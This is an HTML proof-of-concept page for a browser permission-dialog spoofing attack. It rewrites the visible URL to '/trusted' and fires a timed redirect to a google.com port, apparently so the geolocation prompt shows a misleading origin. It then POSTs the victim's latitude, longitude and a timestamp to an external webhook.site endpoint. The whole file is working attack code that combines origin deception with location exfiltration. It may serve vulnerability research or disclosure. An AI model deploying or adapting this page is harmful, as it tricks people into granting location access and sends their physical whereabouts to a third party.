<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Geolocation Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Request Location</h2>
  <p>Tap the button below to request Geolocation permission.</p>

  <button onclick="getLocation()">Get Location</button>
  <p id="output">Location: -</p>

  <div id="locationLink" style="display:none;">
    <p>Click the link below to see the location on Google Maps:</p>
    <a id="mapLink" target="_blank">View on Google Maps</a>
  </div>

  <div class="notice">
    Demo only — observe origin shown in permission dialog
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const output = document.getElementById('output');
const locationLink = document.getElementById('locationLink');
const mapLink = document.getElementById('mapLink');

// URL of your Webhook (replace this with your Webhook URL)
const webhookUrl = 'https://webhook.site/#!/view/11f44e56-235f-4edb-954d-73e1048d7070/bba31c74-8aa0-49f7-8822-807bcf5ef60b/1';

// Function to request location
function getLocation() {
  if (!navigator.geolocation) {
    output.textContent = 'Geolocation is not supported by this browser.';
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // Display the latitude and longitude
      output.textContent = `Latitude: ${lat.toFixed(4)}, Longitude: ${lon.toFixed(4)}`;

      // Create Google Maps link
      const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;

      // Show the link to Google Maps
      mapLink.href = googleMapsUrl;
      mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;

      locationLink.style.display = 'block';

      // Send the geolocation data to the Webhook
      sendDataToWebhook(lat, lon);
    },
    () => {
      output.textContent = 'Permission denied or error retrieving location';
    }
  );
}

// Function to send data to Webhook
function sendDataToWebhook(lat, lon) {
  const data = {
    latitude: lat,
    longitude: lon,
    timestamp: new Date().toISOString()
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => {
    console.log('Success:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
}

/*
 * Step 1:
 * Manipulate visible URL to a trusted-looking path
 */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');  // Changing the URL to make it look trusted
  panel.style.display = 'block';  // Show the panel for requesting the location
};

/*
 * Step 2:
 * Trigger a navigation race shortly after permission flow starts
 */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';  // Redirect to simulate a race condition
      }, 80); // Delay of 80ms before the redirect
    });
  });
});
</script>

</body>
</html>
